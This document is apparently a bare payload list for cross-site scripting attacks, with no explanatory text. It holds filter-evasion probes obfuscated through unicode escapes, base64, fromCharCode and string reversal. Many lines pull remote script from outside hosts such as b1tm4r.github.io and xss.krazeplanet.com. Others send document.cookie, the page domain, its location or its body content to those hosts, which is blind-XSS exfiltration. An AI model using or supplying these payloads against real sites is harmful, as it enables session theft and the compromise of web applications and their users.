...
/* <​/script> &#x3c;img/src/ <​script>window[/al/.source+/ert/.source](origin);<​/script> /> */
...
JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//b1tm4r.github.io-->
JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//b1tm4r.github.io-->
<svg/onload=/*${/*/;{/**/window['c'+'o'+'n'+'f'+'i'+'r'+'m'](1)}//><Base/Href=//b1tm4r.github.io-->
<details open ontoggle=/*${/*/;{/**/self['\u0063'+'\u006f'+'\u006e'+'\u0066'+'\u0069'+'\u0072'+'\u006d'](1)}//><Base/Href=//b1tm4r.github.io-->
<video><source onerror=/*${/*/;{/**/window[String.fromCharCode(99,111,110,102,105,114,109)](1)}//><Base/Href=//b1tm4r.github.io-->
<body onpageshow=/*${/*/;{/**/this['c'+'o'+'n'+'f'+'i'+'r'+'m'](1)}//><Base/Href=//b1tm4r.github.io-->
<select onfocus=/*${/*/;{/**/window['\u0063'+'\u006f'+'\u006e'+'\u0066'+'\u0069'+'\u0072'+'\u006d'](1)}//><Base/Href=//b1tm4r.github.io-->
<textarea onfocus=/*${/*/;{/**/top[atob('Y29uZmlybQ==')](1)}//><Base/Href=//b1tm4r.github.io-->
<input autofocus onfocus=/*${/*/;{/**/parent['mrifnoc'.split('').reverse().join('')](1)}//><Base/Href=//b1tm4r.github.io-->
'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
1'/confirm?.(1)/'
1')"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
001'-confirm`K`-'=1
1<!--><Svg/OnLoad=(confirm)(1)-->
'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle%3D(confirm)(1)-->
;1"' OnError=(confirm)(1) <!--><Img Src='
1"' OnError=(confirm)(1) <!--><Img Src='
1"-confirm`K`-"
...
1'-confirm`K`-'
1'"<!--></Scri%7Kt/><Scri%7Kt/>%7Krompt%6K1%6K</Scri%7Kt>
1'"<!--><Img/Src/OnError=(confirm)(1)>
1")'AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
1'"><Img Src=OnXSS OnError=alert(1)>
001">K%3D'><Svg/OnLoad%3D(confirm)(1)>=1
1<!--><Svg/OnLoad%2B=(confirm)(1)-->
1'" AutoFocus One OnFocus=alert(1)//
001\47\42\55\55\41\76\74Img\40Src\40OnError\75confirm\140\113\140\76=1
;1">K%2B='><Svg%252FOnLoad%2B=(confirm)(1)>/
1">K='><Svg/OnLoad=(confirm)(1)>
1{{$new.constructor('(confirm)(1)')()}}
<!--></Title/</Textarea/</Script/</Iframe/><Details/Open/OnToggle=(confirm)(1)-->%5C
'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->
001"*%2Fconfirm%0B(1)<%2FScript%2F--><Script>%2F*=1
1')"--><K%2FAutofocus%2FContentEditable%2FOnFocusIn%3D%26%2397%26%23108%26%23101%26%23114%26%23116%26%2396%26%2375%26%2396<!--
1')"AutoFocus/ContentEditable/On%0CFocusIn=(conf%0Cirm)(1)//
1'"--><Img/Src/OnError=(confirm)(1)//<!--
1</Script/><Img/Src/OnError%3Dconfirm?.(1)>
')"--><Script/Src=//xss.krazeplanet.com/10.js></Script>
')"--><img src="x" onerror="import('//xss.krazeplanet.com/10.js')">
')"--><img src="x" onload="import('//xss.krazeplanet.com/10.js')">
')"--><svg/onload=import('//xss.krazeplanet.com/10.js')>
')"--><img/onerror=import('//xss.krazeplanet.com/10.js')>
')"--><img/onload=import('//xss.krazeplanet.com/10.js')>
')"--><img src=//xss.krazeplanet.com/10.js OnLoad=import(src)>
')"--><Img Src=//xss.krazeplanet.com/1.js OnLoad%0C=import(Src)//
')"--><img src=x onerror=(alert)(1)||alert(2)||al\u0065rt(3)>
')"--><img src=x onerror=(alert)(1)&&alert(2)&&al\u0065rt(3)>
"><script/src=//b1tm4r.github.io></script>"@x.com
"><img/src/onerror=import('//b1tm4r.github.io')>"@x.com
013371337;ext=<img/src/onerror=import('//b1tm4r.github.io')>
`â€™"><script src=//b1tm4r.github.io></script>
`'"></script></title></textarea><script src=//b1tm4r.github.io></script>
--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://b1tm4r.github.io"></scrIpt>
`'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
`â€™"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
`â€™"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html "onmouseover=/*<svg*/onload=import(/https:\b1tm4r.github.io\/.source)//>
`â€™"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://b1tm4r.github.io\';document.body.appendChild(a)')" />
`â€™"><iframe src="javascript:var a=document.createElement('script');a.src='https://b1tm4r.github.io';document.body.appendChild(a)"></iframe>
`â€™"><div onmouseover="var a=document.createElement('script');a.src='https://b1tm4r.github.io';document.body.appendChild(a)">Hover me</div>
`â€™"><audio src="x" onerror="var a=document.createElement('script');a.src='https://b1tm4r.github.io';document.body.appendChild(a)">
`â€™"><body onload="var a=document.createElement('script');a.src='https://b1tm4r.github.io';document.body.appendChild(a)">
<script>fetch("//b1tm4r.github.io").then(r=>r.text()).then(t=>eval(t))</script>
<iframe srcdoc="<script src='https://b1tm4r.github.io'></script>"></iframe>
<video><source onerror="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))">
<details open ontoggle="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))">
<svg><desc><![CDATA[</desc><script src="https://b1tm4r.github.io"></script>]]></svg>
<style>@import url(https://b1tm4r.github.io);</style>
<math href="javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))"></math>
<svg><foreignObject><iframe srcdoc="<script src='https://b1tm4r.github.io'></script>"></iframe></foreignObject></svg>
<input autofocus onfocus="new Image().src='https://b1tm4r.github.io/?c='+document.cookie">
<input id='x' onfocus=eval(atob(this.id)) autofocus id=dmVyIGM9bmV3IEltYWdlKCk7Yy5zcmM9J2h0dHBzOi8vcml4NHVuaS5lei5wZS8/Yz0nK2RvY3VtZW50LmNvb2tpZTs=>
<textarea autofocus onfocus="location='https://b1tm4r.github.io/?txt='+document.body.innerHTML"></textarea>
<img src="x" onerror="new Image().src='https://b1tm4r.github.io/?e='+document.domain">
<div contenteditable onfocus="fetch('https://b1tm4r.github.io/?x='+document.location)"></div>
<svg><a xlink:href="https://b1tm4r.github.io"><rect onfocus="this.href.baseVal='https://b1tm4r.github.io?svgfocus='+document.domain" tabindex="1"/></a></svg>
<iframe src="javascript:parent.location='https://b1tm4r.github.io?frame='+document.domain"></iframe>
<video src onerror="fetch('https://b1tm4r.github.io?videofail='+document.cookie)"></video>
<details open ontoggle="new Image().src='https://b1tm4r.github.io?toggle='+document.cookie"></details>
<marquee onstart="fetch('https://b1tm4r.github.io?marquee='+document.cookie)">BLIND XSS</marquee>
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://b1tm4r.github.io' /*iframe/src*/>
1')"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://b1tm4r.github.io')//
">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://b1tm4r.github.io'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://b1tm4r.github.io'>
